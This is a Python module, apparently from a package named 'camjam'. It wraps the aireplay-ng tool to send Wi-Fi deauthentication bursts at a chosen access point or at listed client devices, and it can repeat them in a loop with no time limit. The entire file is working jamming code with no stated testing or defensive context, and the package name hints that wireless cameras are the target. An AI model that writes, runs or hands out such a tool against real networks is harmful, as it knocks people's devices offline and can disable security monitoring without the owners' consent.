import subprocess
import time
from typing import List

from camjam import config


class DeauthRunner:
    def __init__(self, interface: str):
        self.interface = interface

    def deauth_ap(self, bssid: str, packets: int = config.DEAUTH_PACKETS) -> None:
        cmd = ["aireplay-ng", "--deauth", str(packets), "-a", bssid, self.interface]
        subprocess.run(cmd, check=False, capture_output=True)

    def deauth_client(self, bssid: str, client_mac: str, packets: int = config.DEAUTH_PACKETS) -> None:
        cmd = [
            "aireplay-ng",
            "--deauth",
            str(packets),
            "-a",
            bssid,
            "-c",
            client_mac,
            self.interface,
        ]
        subprocess.run(cmd, check=False, capture_output=True)

    def run_burst(
        self,
        bssid: str,
        clients: List[str] | None,
        packets: int = config.DEAUTH_PACKETS,
    ) -> None:
        if not clients:
            self.deauth_ap(bssid, packets)
        else:
            for mac in clients:
                self.deauth_client(bssid, mac, packets)

    def run_loop(
        self,
        bssid: str,
        clients: List[str] | None,
        duration: int = config.DEAUTH_DEFAULT_SECONDS,
        stop_flag=None,
    ) -> None:
        start = time.time()
        unlimited = duration <= 0
        while True:
            if stop_flag and stop_flag.is_set():
                break
            self.run_burst(bssid, clients)
            if not unlimited and (time.time() - start) >= duration:
                break
            time.sleep(2)